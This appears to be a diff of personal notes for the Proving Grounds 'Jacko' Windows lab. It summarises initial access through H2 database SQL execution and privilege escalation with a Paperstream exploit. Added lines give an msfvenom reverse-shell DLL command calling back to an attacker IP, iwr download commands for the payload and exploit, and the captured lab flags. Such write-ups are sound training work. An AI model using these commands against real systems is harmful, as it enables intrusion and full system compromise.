@@ -1,23 +1,32 @@
 ---
-Date: 2024-10-28
+Date: 2024-10-30
 Platform: PG-Practice
 Category: Windows
 Difficulty: Intermediate
-Status: In progress
+Status: Complete
 IP: 192.168.194.66
 Writeup: https://medium.com/@Dpsypher/proving-grounds-practice-jacko-d42c9c1e7f9e
+Writeup2: https://benheater.com/proving-grounds-jacko/
 ---
 # Box
-
-
+What the actual fuck... I'll write this up tomorrow, but this was a combination of "Why the fuck isn't this working" with "that is so fucking dumb" when it did finally work
 # Resolution summary
-
+- Ran Nmap to identify ports `80`, `135/445`, `445`, `5040`, `8082` & `9092` 
+- Navigated to port `8082` with browser and logged in with default credentials
+- Found exploit for `H2 Database` and achieved code execution via SQL
+- Uploaded & executed reverse shell via SQL statements for initial access
+- Identified `Paperstream` software and found exploit `49382.py`
+- Used `msfvenom` to create reverse shell `dll` with `x86` architecture & `xor_dynamic`
+- Uploaded `dll` and `49382.ps1` to target via `iwr`
+- Ran `49382.ps1` on target and recieved reverse shell as `NT-system`
 ## Improved skills
-- skill 1
-- skill 2
+- Generating msfvenom payloads
+- Working with Windows kernel exploits (specifically potatos)
 ## Used tools
 - nmap
 - python
+- msfvenom
+- powershell
 
 ---
 # Information Gathering
@@ -148,6 +157,7 @@ Ran `searchsploit "H2"` and identified exploit `49384.txt` to compile and run Ja
 
 ---
 # Privilege Escalation
+## Paperstream Exploit #1
 - Enumerated host programs and identified `Paperstream IP`
 ![[Pasted image 20241029181039.png]]
 - Ran `searchsploit "Paperstream"` - identified & copied exploit `49382.ps1`
@@ -159,8 +169,21 @@ Ran `searchsploit "H2"` and identified exploit `49384.txt` to compile and run Ja
 ![[Pasted image 20241029181732.png]]
 - Started netcat listener and ran `.\paperstreamexploit.ps1` - payload triggered but no reverse shell received
 ![[Pasted image 20241029181902.png]]
-
+## Paperstream Exploit #2
+- Referenced https://benheater.com/proving-grounds-jacko/
+- Ran `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.169 LPORT=445 -f dll -a x86 --platform windows -e x86/xor_dynamic -b '\x00' -o 0xBEN_privesc.dll` to create new `dll` on x86 architecture with `xor_dynamic`
+![[Pasted image 20241030204712.png]]
+- Updated `49382.ps1` to reflect change in `dll` name
+- Ran `iwr -uri http://192.168.45.169/0xBEN_privesc.dll -outfile 0xBEN_privesc.dll` to copy `0xBEN_privesc.dll` onto target (via python3 http server)
+![[Pasted image 20241030204954.png]]
+- Ran `iwr -uri http://192.168.45.169/49382.ps1 -outfile 49382.ps1` to copy `49382.ps1` onto target (via python3 http server)
+![[Pasted image 20241030205106.png]]
+- Started netcat listener on port `445` and then ran `.\49382.ps1` to execute exploit - received shell as `NT-System`
+![[Pasted image 20241030205222.png]]
+![[Pasted image 20241030205245.png]]
+- Ran `type C:\Users\administrator\desktop\proof.txt` to print `b32d47218e9665058f06833a497a4154`
+![[Pasted image 20241030205406.png]]
 ---
 # Trophy & Loot
 `local.txt` = `988d8a67a549358c69a1cab88b594883`
-`proof.txt` = ``
+`proof.txt` = `b32d47218e9665058f06833a497a4154`
